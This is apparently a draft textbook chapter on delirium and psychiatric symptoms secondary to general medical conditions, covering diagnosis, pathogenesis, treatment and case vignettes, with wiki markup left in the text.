Delirium may be defined as ''an acute or subacute disturbance in cerebral functioning leading to impairment in one&lt;nowiki&gt;’&lt;/nowiki&gt;s level of consciousness, orientation, memory, and attention'', usually characterized by &quot;waxing and waning&quot; over hours or days. Common accompaniments of delirium include altered sleep-wake pattern; labile mood; speech disturbance; restlessness or agitation; perceptual abnormalities; and sometimes, psychotic features. Older terms for delirium include &quot;acute organic brain syndrome,&quot; &quot;cerebral insufficiency,&quot; and &quot;acute confusional state.&quot; Not uncommonly, delirium may be superimposed on dementia, a condition sometimes termed &quot;beclouded dementia&quot; (Sadock &amp; Sadock, 2007).

&lt;u&gt;'''''Epidemiology'''''&lt;/u&gt;

Delirium is a very common problem, particularly in emergency, medical-surgical, inpatient, and geriatric settings, such as nursing homes (Levkoff et al, 1991). Substance-abuse and oncology treatment centers also have high rates of delirium (Tasman et al, 1998). Among medical inpatients, the prevalence of delirium ranges from 11-16%, while among elderly patients admitted for acute hospital care, the prevalence ranges from 24-65%. Among elderly patients over age 65, hospitalized for a general medical condition, 10-15% will develop delirium while in the hospital. In general delirium tends to be more common among the very young and the very old, but can affect anyone at any age. Delirium is associated with longer hospital length of stay and mortality in medical surgical inpatients.

&lt;u&gt;'''''Subtypes of Delirium and Classification'''''&lt;/u&gt;

Delirium is sometimes characterized according to the predominant disturbance in motor behavior; i.e., as ''excited'' (&quot;hyperactive&quot;), ''lethargic ''(&quot;hypoactive&quot;) or ''mixed'' delirium (Trzepacz &amp; Meagher, 2008). Some evidence indicates that these motor subtypes have implications for etiology, pathophysiology, presence of non-motor symptoms, and prognosis. Thus, some evidence suggests that patients with hyperactive delirium may have a better prognosis and a lower mortality rate. Hypoactive delirium may be more likely to go undetected, as one might expect from the lack of obvious agitation. However, the definition of these subtypes varies considerably among clinicians and researchers, and their reliability has been questioned.

Another way of considering delirium is expressed by the terms &quot;excitatory&quot; and &quot;inhibitory&quot; syndromes, which we will discuss under Pathogenesis (Ferner, 2003).

Delirium with ''psychotic features''—including delusional misidentification and hallucinations—may be particularly distressing to the patient, even after resolution of the delirium (Trzepacz &amp; Meagher, 2008).

There are several ways delirium may be classified. In the ICD-10 (1993), the main categories are:

* Delirium, Not Induced By Alcohol And Other Psychoactive Substances
* Delirium, Not Superimposed On Dementia, 
* Delirium, Superimposed On Dementia

&lt;u&gt;'''''Other Delirium'''''&lt;/u&gt;

In contrast, the DSM-IV categorizes delirium according to four very broad etiologies: delirium due to ''general medical condition''; ''substance intoxication'' delirium; ''substance withdrawal'' delirium; and delirium due to ''multiple etiologies''. Delirium related to substance intoxication or withdrawal will be discussed in Chapter (   ).

The number of general medical conditions (GMCs) causing delirium is legion. Some common GMCs include ''fluid and electrolyte abnormalities, hypoglycemia, infection or sepsis, head trauma, hepatic encephalopathy, viral encephalitis, renal failure, COPD and brain tumor or hemorrhage.'' A plethora of both prescribed and over-the-counter medications can provoke delirium, including ''analgesics, antibiotics, cardiac medications, anticholinergic agents, psychotropic agents'', and a variety of ''botanicals'', such as jimsonweed. (Sadock &amp; Sadock, 2007)

''Case vignette'': ''An 84 year-old woman with a history of mild congestive heart failure, osteoarthritis, and moderate cognitive impairment thought possibly due to very early DAT appeared confused, disoriented, and hallucinating. She complained of seeing &quot;green faces&quot; and was initially diagnosed as &quot;psychotic.&quot; Physical exam and routine laboratory measures were within normal limits. Her regular medication included digoxin 0.25 mg/day (digoxin level = 0.6 ng/ml; therap=0.5-2.0). Owing to her arthritic pain, she recently had been started on ibuprofen 400 mg tid.''

''A repeat digoxin level shortly after admission showed the level to be 1.2 ng/ml (WNL). An EEG showed slowing of alpha rhythm (7-8 Hz, normal=8-12). The increase in digoxin levels was attributed to the effect of the NSAID, ibuprofen (Goldfrank, 2002). Though the absolute level of digoxin was still within the normal range, its doubling  within a short period of time evidently set off the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s confusion. Abnormal color perception—particularly in the green or yellow end of the spectrum (xanthopsia)—is a classic sign of digoxin toxicity (Piltz et al, 1993).''

&lt;u&gt;'''''Assessment and Diagnostic Testing'''''&lt;/u&gt;

Delirium remains a clinical diagnosis'', ''with a careful ''history, physical exam, mental status exam, and review of medication and laboratory findings ''as the most useful diagnostic &quot;instruments&quot; (Sadock &amp; Sadock, 2007).  Typically, the onset of delirium is acute (over a period of hours, days, or in some cases weeks) and there is a marked change from the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s &quot;baseline&quot; cognitive state. A recent change in medication; recent substance abuse/discontinuation; or some recent medical or neurological event (fall, infection, stroke, etc.) may provide the critical historical clues. The classic findings on mental status include a fluctuating level of consciousness (e.g., the patient &quot;nods off&quot; or drifts in and out of awareness); inability to pay attention to the examiner; disorientation to date and place (though intact orientation does ''not'' rule out delirium); impaired recent memory (e.g., inability to recall 3 of 3 items after 5 minutes); and associated features, such as disorganized thought processes (tangentiality, loose associations), perceptual abnormalities (auditory, and particularly, prominent ''visual'' or ''tactile'', hallucinations); and psychomotor abnormalities (agitation, slowing). Affect may be quite labile, and delusions may also be present.

When delirium is superimposed upon dementia, it appears that delirium phenomenology generally overshadows that of the dementia. Thus, delirium tends to present similarly regardless of whether it is accompanied by dementia. The clinical maxim should be, &quot;altered mental status reflects delirium until proven otherwise,&quot; in order to prevent misattribution of delirium to the more chronic brain syndrome of dementia (Trzepacz &amp; Meagher, 2008, p. 451). History from family members or caregivers may provide critical information suggesting a more acute change in functioning.

''Physical examination'' may be difficult in an agitated, delirious patient, but every effort must be made to rule out head trauma, acute neurological events, and severe autonomic dysfunction (such as marked hypotension). Pulse, blood pressure, temperature, respirations should all be checked. An examination of the head and neck—including papillary function and extraocular movements—should be carried out. A basic assessment of heart, lungs, and neurological function should be obtained. Specific physical findings may provide a clue as to the etiology of the delirium. For example, a patient with ''papilledema and hypertension'' may be experiencing hypertensive encephalopathy; ''nuchal rigidity'' may point to meningitis or subarachnoid hemorrhage (Sadock &amp; Sadock). One helpful clue may be ''pupillary findings'': in cases of anticholinergic toxicity, pupils may be dilated but sluggish; in cases of &quot;hyper-adrenergic&quot; delirium (e.g., in sedative withdrawal, amphetamine/cocaine intoxication, or hyperthyroid storm), pupils may be dilated by briskly ''reactive'' (Ferner, 2003).

Adjunctive ''screening instruments'' for detecting delirium include the CAM (Confusion Assessment Method); the CTD (Cognitive Test for Delirium); and the DRS-R98 (Delirium Rating Scale, Revised 98). The CAM is probably the most widely used delirium screening test in general hospital settings, and is based on DSM-III criteria (Trzepacz &amp; Meagher, 2008). Recently, Fanjiang &amp; Folstein (2001) developed a simple screening scale for use by medical students, called the ''Three Item Delirium Scale''. This requires the presence of ''altered consciousness'' plus either ''cognitive impairment'' or ''hallucinations''; preliminary data suggest good sensitivity and specificity for delirium (Trzepacz &amp; Meagher, 2008).

''Laboratory measures and ancillary testing: ''There is no pathognomonic &quot;test&quot; for the diagnosis of delirium. However, it is important to obtain routine laboratory studies on all delirious patients, including—most urgently--complete blood count, electrolytes

( including calcium, magnesium, and phosphate), renal and hepatic functions (including ammonia), serum glucose and erythrocyte sedimentation rate. Thyroid functions should also be checked. A blood and/or urine screen for drugs of abuse is helpful, and serologic tests for syphilis (such as VDRL) and HIV infection may also be indicated. An electrocardiogram (EKG) and chest radiograph are usually appropriate, in order to rule out cardiac arrhythmia, silent ischemia, or occult pneumonia among other causes. A bedside test for oxygenation is also useful. An electroencephalogram (EEG) is often advised as a standard study in the work up of delirium (Sadock &amp; Sadock, 2007), since the EEG often reveals either generalized slowing or focal areas of hyperactivity. (Serial EEGs may also be helpful in following the &quot;progress&quot; of treatment, in that one may see restoration of normal (8-12 Hz) alpha rhythm as the delirium resolves). Depending upon history and specific medical presentations, ancillary tests, such as lumbar puncture, blood cultures, B12 level, and structural brain imaging (CT, MRI) may be clearly indicated. It is important to note that correction of underlying metabolic, electrolyte, or other abnormalities does not necessarily lead to immediate resolution of the delirium; typically, there is a &quot;lag&quot; between such corrections and the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s level of consciousness. This is particularly true in those circumstances where CNS drug levels (e.g. lithium) may normalize more slowly than blood levels; or when correction of blood abnormalities

(such as high glucose or sodium) needs to occur slowly, in order to prevent CNS complications.  One should treat the ''patient'', not the &quot;lab slip&quot;!

&lt;u&gt;'''''Pathogenesis of Delirium'''''&lt;/u&gt;

Even though delirium may arise from a multitude of underlying causes, several unifying hypotheses have been advanced to explain the general mechanisms of most delirious states (Ferner, 2003). One such hypothesis emphasizes the balance between ''excitatory and inhibitory neurotransmission'' in the brain, and derives a broad separation of brain syndromes on this basis. For example, ''excitatory delirium syndromes'' may involve excessive augmentation of excitatory neurotransmitters, such as glutamate, dopamine and norepinephrine (serotonin may also be considered excitatory to some degree). Antagonism of certain cholinergic receptors, on this view, also constitutes an &quot;excitatory&quot; effect. Thus, delirium syndromes as diverse as amphetamine toxicity and poisoning with the anticholinergic agent benztropine would be predicted to have similar excitatory effects, including ''agitation, tachycardia, hypertension ''and ''fever.'' (Anticholinergic syndromes may present with the classic and memorable findings of &quot;hot as a hare, mad as a hatter, red as a beet, dry as a bone&quot;; i.e., ''fever, agitated confusion or psychosis; red skin; ''and'' dry mouth'').

''Inhibitory delirium syndromes'', in Ferner&lt;nowiki&gt;’&lt;/nowiki&gt;s view (Ferner, 2003), involve agents that augment the inhibitory neurotransmitter, GABA, or act as agonists at the mu opioid receptor. Thus, in large quantities, GABA agonists such as benzodiazepines (and to some degree, ethanol) or opioids such as morphine may cause delirious states characterized by ''drowsiness, ataxia, respiratory suppression, ''and'' slurred speech.'' Pathological alterations in GABA activity--perhaps amplified by an endogenous toxin that binds to benzodiazepine receptors--have also been implicated in hepatic encephalopathy (Rummans et al, 1995). In some cases of inhibitory syndromes, &quot;paradoxical&quot; agitation may result from disinhibition of higher brain centers that normally suppress aggression or agitation (Ferner, 2003).

Another unifying hypothesis focuses specifically on ''low'' ''cholinergic ''and ''high dopaminergic transmission ''in delirium (Trzepacz &amp; Meagher, 2008),

as well as derangements in ''non-dominant, posterior parietal ''and'' prefrontal cortices.'' Other brain regions, including the brain stem, basal ganglia and thalamus, are likely to be involved. Importantly for the cholinergic hypothesis, a variety of disease states causing delirium are associated with cholinergic deficiency; e.g., thiamine deficiency, hypoxia, and hypoglycemia all ''reduce acetylcholine'' by affecting the oxidative metabolism of glucose and production of acetyl coenzyme-A (Trzepacz &amp; Meagher, 2008).

The pathogenesis of delirium must also consider predisposing medical risk factors, though, as Trzepacz and Meagher note, these must not be confused with ''causes'' of delirium. Predisposing factors include but are by no means limited to: ''genetic risk factors'' (such as APOE4 genotype); ''old age''; ''pre-existing cognitive impairment; use of multiple medications'' (especially anticholinergic agents and opioids); ''pre-existing cerebrovascular accident/stroke''; and ''vitamin'' (especially thiamine) ''deficiency'' (Trzepacz &amp; Meagher, 2008).

To some degree, psychological factors, as well as quality of hospital care, may also influence certain aspects of delirium. As Mohta et al (2003) have pointed out, the experience of being in the intensive care or trauma unit may activate various psychological defense mechanisms, such as denial, regression, anger, anxiety and depression. Delirium itself may, in some cases, represent a regressive defense, though  such psychodynamic hypotheses must never vitiate the clinician&lt;nowiki&gt;’&lt;/nowiki&gt;s search for specific physiological precipitants.

The likelihood of delirium may also be influenced by the kind of care the patient receives. For example, Inouye and coworkers (1999) evaluated 852 hospitalized older patients who were nonrandomly assigned to usual care or management with a multi-pronged intervention designed to minimize risk factors for delirium. These protocols included repeated reorientation of the patient; provision of cognitively stimulating activities; a nonpharmacologic sleep protocol; early mobilization activities and range of motion exercises; timely removal of catheters and physical restraints; use of eyeglasses and hearing aids; and early correction of dehydration. These interventions significantly reduced the incidence of delirium (15.0% in the usual care group versus 9.9% in the intervention group).

&lt;u&gt;'''''Treatment and Management of Delirium'''''&lt;/u&gt;

The primary treatment of delirium entails diagnosing and correcting the ''underlying cause'' of the brain dysfunction. Thus, if an electrolyte disturbance appears to be the causal factor, one corrects it; if an infection seems to be &quot;driving&quot; the delirium, one treats it with appropriate anti-microbials (which may also provoke confusional states). If the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s delirium appears due to a newly-prescribed medication, that agent is held or discontinued immediately, if clinically safe and feasible. (If one must avoid a superimposed withdrawal syndrome, the offending agent is tapered off and discontinued as rapidly as possible).

There are some &quot;cause-specific&quot; agents that treat a few narrowly-defined types of delirium. For example, in cases of known or suspected anticholinergic-induced delirium, the cholinesterase inhibitor, ''physostigmine'', is indicated (and in the U.S., has FDA-approved labeling for this use). However, physostigmine is not without its own side effects, such as bradycardia. In cases of known or suspected alcohol withdrawal-related delirium (delirium tremens, &quot;DTs&quot;), a ''benzodiazepine'' is the treatment of choice (see Chapter ….). For benzodiazepine-induced delirium, limited data suggest that the benzodiazepine antagonist, ''flumazenil'', may be useful (Olshaker &amp; Flanigan, 2003).

In many cases of delirium, a specific cause is not identified, or multiple causes are suspected. If, after a thorough medical evaluation, no specific etiology is found, one is left to &quot;manage&quot; the neurobehavioral complications of delirium as effectively and safely as possible—and without making matters worse. Unfortunately, many psychotropic agents used to manage the behavioral complications of delirium (such as agitation or disinhibted behavior) may themselves cause confusion or exacerbation of the delirium. Thus, treatment should be as conservative as possible, avoiding high doses, or agents whose mechanisms of action overlap with those of drugs implicated in causing the delirium. For example, the hallucinogen, phencyclidine (&quot;PCP&quot;, &quot;Angel Dust&quot;) has complex effects on acetylcholine (Helman &amp; Habal, 2006) that may be exacerbated if one treats PCP-induced psychosis with a highly anticholinergic phenothiazine.

For management of neurobehavioral complications of delirium (marked agitation, aggression, tearing out IV lines, etc.), the agents of choice remain the higher-potency neuroleptics, particularly haloperidol (5-40 mg/day, in divided doses) (Inouye, 2006a). Although larger doses have been used intravenously, particularly in ICU or SICU settings, these agents have risk of producing torsades des pointe arrythmias, which have been associated with lethal ventricular arrythmias, particularly in patients with hypovolemia, hypomagnesemia or other electrolyte abnormalities. (Hassaballa &amp; Balk, 2003).

There is, however, increasing interest in use of newer &quot;atypical&quot; antipsychotics in this setting, and some limited data suggest they may be safe and effective (Han &amp; Kim, 2004). Although benzodiazepines, such as lorazepam, are often administered to delirious patients, this group of agents carries significant risks in this population; e.g., paradoxical &quot;disinhibition,&quot; worsening, or prolongation of the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s confusion (Inouye, 2006 a,b). With the exception of delirium tremens, there are few instances of delirium in which benzodiazpines would be indicated.

There is also considerable interest in—but only preliminary evidence for—the use of ''cholinesterase inhibitors'' such as ''donepezil'' (see above, re: DAT) in delirium. Preliminary evidence has been mixed, and clinical observation suggests that any beneficial effects on confusion and memory impairment are modest and slowly-achieved (Jacobson et al, 2007). One recent controlled study (Liptzin et al, 2005) was &quot;…unable to demonstrate a benefit for donepezil in preventing or treating delirium in a relatively young and cognitively-intact group of elderly patients undergoing elective orthopedic surgery.&quot;

''Non''-pharmacologic approaches to the delirious patient are an important part of good care, and include provision of &quot;orienting cues&quot;, such as clocks and calendars; continuity of nursing care; placement of familiar objects (such as a family picture) near the patient; and therapeutic use of friends and family to create a familiar and calming environment (Rummans et al, 1995). Finally, primary prevention of delirium involves a comprehensive strategy, including: 1) recognizing and mitigating known risk factors such as dehydration, sleep deprivation, hearing impairment, etc. (Inouye et al, 1999); 2) proactive geriatric consultation, prior to planned surgery; and 3) education of staff charged with the care of high-risk patients (Trzepacz &amp; Meagher, 2008).

&lt;u&gt;'''''Psychiatric Symptoms Secondary to General Medical Conditions'''''&lt;/u&gt;

There is a complex and multidimensional relationship between psychiatric and medical illnesses. Psychiatric illness can be exacerbated by the presence of co-morbid medical illness and its management can be made more complex by pharmacologic or other management needs of medical illness. Psychiatric illness can present in general medical settings with medical symptoms secondary to psychiatric illness. Finally psychiatric disorders can be directly caused by the presence of known or occult medical/neurological illness.  In this section, we will focus on this last category.

In the DSM-IV, this heterogeneous group of diagnoses comprises six main categories: ''psychotic disorders, mood disorders, anxiety disorders, catatonic disorders, personality alterations, ''and'' amnestic disorders''. In the ICD-10, the term &quot;organic&quot; is applied to the first five categories; e.g., ''organic hallucinosis ''and'' organic delusional disorder; organic mood &lt;nowiki&gt;[&lt;/nowiki&gt;affective&lt;nowiki&gt;]&lt;/nowiki&gt; disorder; organic anxiety disorder; organic catatonic disorder; ''and'' organic personality disorder''. We have already alluded to what we view as philosophical problems with the term &quot;organic&quot;. For this reason, we will use the neutral designation, ''psychiatric symptoms secondary to general medical conditions'' (Psy-GMCs) as a &quot;bridging&quot; term to encompass both the DSM and ICD categories.

&lt;u&gt;'''''Prevalence in selected settings'''''&lt;/u&gt;

The community prevalence of psychiatric symptoms secondary to general medical conditions (Psy-GMCs) is not well-established, nor is it straightforward to determine. Data from a consultation-liaison service, however, provide some sense of how common Psy-GMCs may be in certain high-risk medical settings.  For example, Rundell and Wise (1989) reviewed  755 cases seen by the psychiatric C-L service in a general hospital.  Fully 38% of depressed patients had some underlying medical or neurological disorder as the likely cause of their depression. The most frequent diagnoses were cerebrovascular accident; Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis. With respect to manic syndromes on this C-L service, the findings were even more striking: ''87% of manic patients ''had a diagnosis of &quot;organic mood disorder.&quot; The most commonly-implicated causes of this &quot;secondary mania&quot; were corticosteroids, human immunodeficiency virus (HIV) infection, and temporolimbic epilepsy. Psychiatric clinic populations may also show a high prevalence of GMCs associated with psychiatric symptoms. Thus, Koranyi (1979) found that in a psychiatric clinic population, 18% had psychiatric symptoms that could be attributed solely to an underlying—and undetected—medical problem. On the other hand, in routine, non- general hospital, psychiatric inpatient settings, some types of Psy-GMCs may be quite rare. For example, Lo et al (2007) found that the prevalence of &quot;organic delusional disorder&quot; according to DSM-III-R criteria was only 0.4% of total inpatient psychiatric admissions.

&lt;u&gt;'''''General features and phenomenology of Psy-GMCs'''''&lt;/u&gt;

There are no pathognomonic signs that reliably distinguish  psychiatric disturbances due to general medical  (&quot;organic&quot;) conditions (Psy-GMCs) from those due to primary psychiatric disorders. For example, with respect to ''manifestations of the'' ''depression itself'', there are no singular objective features that would unequivocally distinguish, say, depression due to ''folic acid deficiency'' from depression seen in a typical ''major depressive episode''. However, careful attention to (1) the onset, history, and course of the present illness; (2) the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s age, prior medical and psychiatric illnesses, and family history; as well as (3) accompanying physical and laboratory findings, may all be of help.

For example, depressive, manic, anxious, or psychotic symptoms that appear to &quot;track with&quot; (correspond closely in time and intensity) the course of an underlying medical disorder may prove to be secondary to that disorder (see Case Vignette). Similarly, the onset of psychiatric symptoms following the introduction, discontinuation, or change in dosage of a particular drug should always raise the prospect of a &quot;secondary&quot; psychiatric syndrome.

The ''mental status exam'' may provide clues as to the &quot;secondary&quot; nature of the psychiatric disturbance; e.g., unusual cognitive deficits (such as severe memory impairment) in a patient presenting with anxiety (Goldman, 1992). Abnormal findings on ''physical examination'' (such as hypo- or hyperactive reflexes, signs of vitamin deficiency, etc.) and ''laboratory testing'' (such as anemia, decreased thyroid function, etc.) may also be helpful in discerning an underlying GMC.

On the other hand, correction of an underlying physical abnormality or drug toxicity does not always translate into an ''immediate'' remission of secondary psychiatric symptoms; often, there is a &quot;lag&quot; between correction of the underlying medical or drug-related problem and return to euthymia or baseline mental state. Indeed, as Colon and Popkin observe, sometimes—despite correction of the underlying medical problem—the secondary psychiatric symptoms may develop &quot;a life of their own&quot; and persist for long periods (Colon &amp; Popkin, 2006). Furthermore, as O&lt;nowiki&gt;’&lt;/nowiki&gt;Brien et al (2006) note,

&quot;In some cases (eg, adrenal insufficiency), appropriate and continued treatment of the underlying condition results in resolution of the psychiatric symptoms. In others (eg, SLE), treatment of the underlying condition may alleviate but may also exacerbate psychiatric symptoms.&quot;

''Advanced age, or older age of onset of psychiatric illness '' is sometimes a clue to an underlying GMC, though by no means an infallible one. Since the elderly (as well as the very young) are at greater risk for medical illnesses generally, the sudden appearance of apparent psychiatric symptoms in someone over the age of 55 ought to trigger a search for underlying medical factors (though one could say the same for a younger patient with a similarly abrupt onset of psychiatric illness). One&lt;nowiki&gt;’&lt;/nowiki&gt;s level of suspicion is generally highest in an ''older'' patient whose ''family history'' is &quot;negative&quot; for psychiatric disorders, and whose symptoms appear ''temporally linked to a GMC or drug-related event''. In this regard, Lo et al (2007) reported that compared to patients with (functional) Delusional Disorder, those with &quot;Organic Delusional Disorder&quot; usually had an older age of onset, and less frequently had a relevant family psychiatric history. Similarly, patients diagnosed with &quot;organic mood disorder&quot; were more likely to have a negative family history of depression, compared to medically-ill patients with a diagnosis of major depression (Yates et al, 1991). The patients with organic mood disorder were also less likely than their counterparts to have recovered fully after four years, despite similar treatment as those with major depression. As noted above, patients with older age at onset of affective illness, and without family history of depression, are more likely to have evidence of vascular CNS abnormalities on MRI than those with earlier onset illness.

With respect to temporal patterns, an important caveat is in order here: as Colon and Popkin (1996) judiciously observe:

&quot;Many clinicians are inclined to rely heavily on a temporal relation to establish an organic etiological relation. Although temporal relation is an instructive parameter, it may be misleading and subject to errors of recall. It is also apparent that psychiatric symptoms may antedate the clinical recognition of the physical illness—that is, anxiety and depression may be the first presenting features of a medical illness.&quot; (p. 413)

Sometimes, the &quot;phenomenology&quot; of the syndrome may provide a clue as to its etiology, though this is far from universally the case. For example, when ''psychotic symptoms'' develop in the context of a GMC, they tend to present in a characteristic pattern. Thus, many secondary psychotic syndromes are characterized by paranoid delusions, persecutory thoughts, and ideas of reference. Delusions tend to be ''concrete and changeable'', in contrast to the often elaborate, bizarre, and relatively stable delusions seen in, say, schizophrenia or mania. Lishman characterizes &quot;organic delusions&quot; as often ''persecutory'' in content, but typically &quot;…poorly elaborated, vague, transient, and inconsistent…&quot; (Lishman, 1998, p. 11). So, for example, the elderly patient in a nursing home who develops an &quot;organic psychosis&quot; may say, on Monday, &quot;The nurses are trying to poison me.&quot; On Tuesday, the same patient may have no particular fears regarding the nurses, but may complain, &quot;My roommate is stealing my jewelry.&quot;  However, in organic delusional syndromes ''without clouding of consciousness'', Lishman notes that &quot;…the delusions may be more coherently organized, with a picture more closely resembling schizophrenia.&quot;

With respect to GMCs associated with anxiety, Colon and Popkin (1996) note that, &quot;…there are few current data to indicate whether panic emerging in the medical patient differs from that seen in the primary psychiatric setting. In addition, no data are available about factors such as course and onset in the medical setting.&quot; One exception is the finding by Starkman et al (1985) showing that in patients (N=17) with pheochromocytoma—a GMC long-associated with anxiety-- none described the severe apprehension or fear characteristic of panic attacks, and ''none described agoraphobia.''

Depression in the medical setting is comprehensively reviewed by Rouchell et al (1996). Again, there are no pathognomonic signs that clearly point to &quot;secondary&quot; or &quot;organic&quot; depressive symptoms. In addition, the standard diagnostic criteria for major depression in DSM-IV have not been normed for individuals with co-morbid medical illness. However, Goldman (1992) offers the following clues suggesting an underlying medical cause: ''an atypical clinical picture; resistance to standard treatments; unexplained personality changes; and subtle cognitive findings on mental status exam''.

The course of Psy-GMCs depends to a large degree on the nature of the underlying medical condition and how responsive it is to primary treatment. The course is also influenced by the extent and success of symptomatic psychiatric treatment. For example, when there is a progressive or intermittently active degenerative CNS process at work, such as multiple sclerosis, course and outcome are likely to be less favorable. On the other hand, psychiatric symptoms due to acute anticholinergic toxicity may be resolved within a matter of hours, if diagnosis and treatment proceed expeditiously.

&lt;u&gt;'''''Psychotic Disorder Due to GMC'''''&lt;/u&gt;

Psychotic symptoms may result from a multitude of medical and neurological disorders, as well as from numerous drug-related side effects. Some of the more common organic etiologies are shown in Table 2.

In the DSM-IV, ''Psychotic Disorder Due to GMC'' is sub-typed based on the predominant symptom; i.e., &quot;with delusions&quot; or &quot;with hallucinations&quot;. Of course, the two often occur together. The DSM-IV also specifies that the symptoms must not occur exclusively while the patient is ''delirious'', or be better explained by another mental disorder.

Although a plethora of medical and neurological conditions may produce psychotic symptoms, particular attention should be focused on disorders affecting the ''occipital'' and ''temporal'' regions. For example, cerebral tumors in these regions may produce hallucinations in various modalities, as well as delusions (Sadock &amp; Sadock, 2007). The differential diagnosis of &quot;psychosis&quot; is therefore extremely important. In one study (Malmud, 1967) 6 of 11 patients with temporal lobe tumors initially presented with a diagnosis of ''schizophrenia, ''though other studies of patients with temporal lobe tumors have shown much lower rates of psychotic symptoms . ''Complex partial seizures'' originating in the temporal or frontal regions may also  produce psychotic-like symptoms, as well as olfactory or gustatory hallucinations. ''Substance-induced psychotic disorders'' are discussed in Chapter (    ).

''Case vignette: Ms. A, a 38-year-old white female with long history of vague medical problems, was brought to emergency room by her family because she had boarded up all the windows at her house and refused to come outside. The patient claimed her neighbors were &quot;spying&quot; on her and &quot;want to do me in.&quot; She was fully oriented, and both recent and remote memory intact. There was no fluctuation in her level of consciousness. The patient denied any unusual perceptual changes, auditory, visual, or tactile hallucinations. Physical examination was essentially normal. However, laboratory studies revealed normocytic anemia, leukopenia, and red cell casts in urine. Subsequent testing for antinuclear antibody (ANA) was strongly positive; a provisional diagnosis of systemic lupus erythematosus (SLE) with cerebral involvement (&quot;lupus cerebritis&quot;) was made.''

&lt;u&gt;'''''Mood disorder due to general medical condition'''''&lt;/u&gt;

The DSM-IV recognizes four main subtypes of mood disorder due to a GMC: ''with depressive features; with major-depressive like episode; with manic features; ''and'' with mixed features. ''The ICD-10 uses a slightly different scheme, differentiating ''organic manic disorder; organic bipolar disorder; organic depressive disorder; ''and'' organic mixed affective disorder.''

As with the psychoses due to GMCs, secondary mood disorders may stem from a multitude of underlying medical and neurological conditions. In consultation-liason settings, as noted earlier, the most frequent underlying GMCs were cerebrovascular accident (including stroke); Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease; lupus cerebritis, HIV infection, hypothyroidism, and multiple sclerosis (Rundell &amp; Wise, 1989). Post-stroke depression merits special attention, in that as many as 50% of all post-stroke patients experience depressive illness. A similar percentage applies to patients with pancreatic cancer, and to about 40% of patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Sadock &amp; Sadock, 2007). However, the diagnosis of depression in the medical setting is complicated by the substantial overlap between ''somatic symptoms'' related to the underlying GMC, and ''neurovegetative symptoms'' of depression (for review, see Harnett, 2001). For example, some data (Musselman et al, 1998) indicate that major depression is seen in approximately 15-20% of patients with coronary (ischemic) heart disease (IHD). However, depression may sometimes be over-diagnosed in this population if &quot;lethargy&quot; or &quot;apathy&quot; ''secondary to congestive heart failure'' is inappropriately counted as signifying major depression. There may also be over-diagnosis of depression in IHD patients who have become &quot;demoralized&quot;—but not clinically depressed—about their medical setbacks (Harnett, 2001).

Indeed, the pathophysiological relationship between underlying medical illness and mood disorder is quite complex. For example, it is not always clear to what degree a depressed medical patient may be &quot;reacting psychologically&quot; to the incapacity stemming from a GMC; or experiencing subtle but direct ''biochemical and immunological effects on the brain'', stemming from the GMC (Harnett &amp; Pies, in press). One illustration of this is in the area of IHD. Depression-related immune dysfunction may worsen IHD via inflammatory cytokines (e.g., interleukin-6, tumor necrosis factor alpha). But IHD-related immune abnormalities may also contribute to depression (Kop et al, 2005). Moreover, social isolation, psychosocial stress, and low levels of perceived support are related to ''both ''depression ''and'' IHD, and could mediate bidirectional effects on these conditions (Barth et al, 2004; Lett et al, 2004). However depression is a well-established risk factor for increased mortality in post-myocardial infarction patients. In short, there are very complex relationships between underlying medical illness and the appearance of depressive symptoms.

This is also true, to some degree, with ''medication-related'' mood alterations. Establishing a causal connection between ingestion of a particular drug and the development of clinical depression is far from straightforward, notwithstanding epidemiological evidence linking some drugs with depression (Rogers and Pies, 2008). Although often mentioned as causes of drug-induced depression, ''beta blockers'' and ''calcium channel blockers'' are only weakly-linked with this side effect. In contrast, some medications—such as ''alpha-interferon'' and ''isotretinoin''—do appear strongly, if not causally, linked with new- onset depression (Bonaccorso et al, 2002; Wysowski et al, 2001)

''Case vignette'': ''Mr. A., a 65-year-old married male without prior psychiatric history presented with a one month history of &quot;feeling really down.&quot; He also related that, for the past three weeks or so, he had experienced vague gastrointestinal distress; decreased appetite; and a 15-lb weight loss. One month earlier, a close friend had died after a long illness, and Mr. A. attributed his sadness to this recent loss. Mental status exam was notable for a pale, cachectic individual whose affect appeared somewhat blunted, with occasional tearfulness. Cognitive examination was essentially within normal limits. Physical examination revealed an enlarged, non-tender gallbladder, and slight jaundice. Urinary amylase levels were elevated. A CT scan of the abdomen revealed cancer of the head of the pancreas with obstruction of the gallbladder.''

&lt;u&gt;'''''Anxiety disorder due to general medical condition'''''&lt;/u&gt;

'' ''

The DSM-IV defines three main subtypes of anxiety disorder due to GMC: with ''generalized anxiety'', with ''panic attacks'', and with ''obsessive-compulsive'' symptoms. Although the overall prevalence of anxiety due to GMCs is not known, there is substantial evidence that medically-ill individuals have higher rates of anxiety than does the general public (Sadock &amp; Sadock, 2007). For example, one study of patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s disease found that 38% of patients received a current DSM-III-R anxiety disorder diagnosis, including panic disorder, generalized anxiety disorder, and social phobia (Stein et al, 1990). Importantly, severity of anxiety was not correlated with severity of parkinsonian symptoms, cumulative duration of L-dopa exposure, or current dose of L-dopa. Similarly, among diabetic patients, the lifetime prevalence rates for phobic disorders and generalized anxiety disorders were 26.5% and 41%, respectively (Lustman et al, 1986).

